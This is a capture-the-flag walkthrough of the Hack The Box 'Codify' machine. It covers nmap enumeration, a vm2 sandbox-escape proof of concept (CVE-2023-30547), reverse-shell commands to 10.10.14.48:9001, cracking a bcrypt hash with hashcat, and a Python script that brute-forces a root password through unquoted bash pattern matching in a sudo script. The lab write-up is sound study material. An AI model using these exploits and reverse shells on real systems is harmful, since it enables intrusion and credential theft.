# Enumeration

## NMAP
```
❯ sudo nmap -sCV -T4 10.10.11.239
[sudo] password for p3ta: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 12:47 PST
Nmap scan report for 10.10.11.239
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.89 seconds
```
## curl
Run curl to determin host name and enumate port 80
```
❯ curl 10.10.11.239
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://codify.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80</address>
</body></html>
```

### Add codify.htb to /etc/hosts
```
echo -e "\n10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```
## Visiting the Web Page
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/9f82b6d3-ee99-4221-9eb8-1f3fbe3022f6)

### Limitations of the tool
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/9f8c4079-bc45-48ef-8171-9df1807241b1)

### About the editor
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/4c28b75d-0984-45c9-be96-1cfd3ec7cc67)

### VM2 3.9.16
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/b3353319-f975-4cc0-b92b-c057060efb65)

```
vm2	CVE-2023-30547	There exists a vulnerability in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsanitized host exception inside handleException() which can be used to escape the sandbox and run arbitrary code in host context.	SeungHyun Lee
```
# Exploiting VM2
## POC
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

### Code
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/4e7784ca-56ce-406d-bd2c-f8edc2cfa5ea)

### Reverse Shell Attempt
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("echo 'sh -i >& /dev/tcp/10.10.14.48/9001 0>&1' > shell");
}
`

console.log(vm.run(code));
```
My shell file made it
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/82806d1d-9373-457d-bab9-3c2be807572a)

Make the file executable 
```
c.constructor('return process')().mainModule.require('child_process').execSync("chmod +x shell");
```
This RS did not work going to play around with the same idea though.

```
#! /bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.48/9001 0>&1'
```
To create the file run this twice
```
echo '#! /bin/bash' >> exploit.sh
echo bash -c "bash -i >& /dev/tcp/10.10.14.48/9001 0>&1" >> exploit.sh

```
execute the RS
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash exploit2.sh');
}
`

console.log(vm.run(code));
```
### stabolize shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
svc@codify:~$ ^Z
[1]  + 124481 suspended  nc -lvnp 9001
❯ stty raw -echo; fg
[1]  + 124481 continued  nc -lvnp 9001

svc@codify:~$ export TERM=xterm
svc@codify:~$ 
```

In linpeas i noticed this directory in www

![image](https://github.com/p3ta00/MasterNotes/assets/128841823/9fec3646-380a-43b0-b35b-841b5a2a55c8)

And a tickets.db file existed
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/85c62d02-f3da-4d69-9912-f00096477d21)

transfer the file to your linux machine. 

![image](https://github.com/p3ta00/MasterNotes/assets/128841823/11f07dc3-6b37-421f-8d30-24529bfd4fe1)
I didn't have to transfer the file after all. 

## Hashcat
```
hashcat -m 3200 hash.txt /home/p3ta/tools/wordlists/rockyou.txt
```
```
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```
## SSH
```
❯ ssh joshua@10.10.11.239
joshua@10.10.11.239's password
```
Get a proper shell with 
```
export TERM=xterm
```

### Sudo -L
```
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
### mysql-backup.sh
```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

## Exploiting the Script
The right side of the == in a bash script is not quoted, Bash will perform pattern matching instead of treating it as a string

```
import string
import subprocess

all_characters_and_numbers = list(string.ascii_letters + string.digits)

password = ""
found = False

while not found:
    for character in all_characters_and_numbers:
        command = f"echo '{password}{character}*' | sudo {path/to/file/"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
        print(password)
```

## Vulnerability to Brute Force:

The script you initially shared does not limit the number of attempts a user can make to enter the correct password. This lack of rate limiting or account lockout mechanisms makes it susceptible to brute-force attacks, like the one attempted by the Python script.
## Feedback for Each Guess:

The script confirms when a part of the password is correct ("Password confirmed!"). This feedback can be used by an attacker to incrementally guess the entire password, as demonstrated by the Python script.

## Execution Context:

The Python script requires the ability to execute the targeted script (sudo {path/to/file}). If the Python script can run this command (especially with sudo), it indicates that the execution environment is already compromised to a degree, as the Python script has significant privileges.

# Root
![image](https://github.com/p3ta00/MasterNotes/assets/128841823/a4e6ce12-d256-4b4b-a66c-de47b9a9ae11)
